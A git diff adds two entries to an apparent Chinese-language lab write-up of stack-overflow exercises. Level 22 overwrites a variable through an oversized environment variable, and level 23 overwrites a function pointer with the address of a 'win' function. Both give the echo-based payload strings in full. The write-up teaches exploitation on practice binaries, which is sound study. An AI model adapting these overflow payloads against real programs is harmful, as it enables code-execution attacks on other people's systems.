@@ -132,6 +132,30 @@ stack-overflow-change-variable-to-the-right-value
 
 ### level22
 
+ stack-overflow-modify-variable
+
+观察程序，需要设置环境变量NJUCS，同时覆盖modified的值为0x0d0a0d0a，通过定位，更改NJUCS的值，其中涉及不可见字符，用echo形式返回值，输入命令（没有换行）：
+
+```
+export NJUCS=`echo -e 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP\x0a\x0d\x0a\x0d'`
+```
+
+再执行程序`./flag22`，得到flag
+
+![](img/level22.png)
+
+
+
+### level23
+
+stack-overflow-overwrite-function-pointer
+
+观察程序，需要将fp的地址指向win，通过输入gets覆盖到fp的值，定位为ebp-0xc，即0xbffff62c，同时，fp地址包含不可见字符，通过管道重定向，输入为（没有换行）：
+` echo -e 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP\x6b\x84\x04\x08'|./flag23`
+成功得到flag
+![](img/level23.png)
+
+
 
 
 
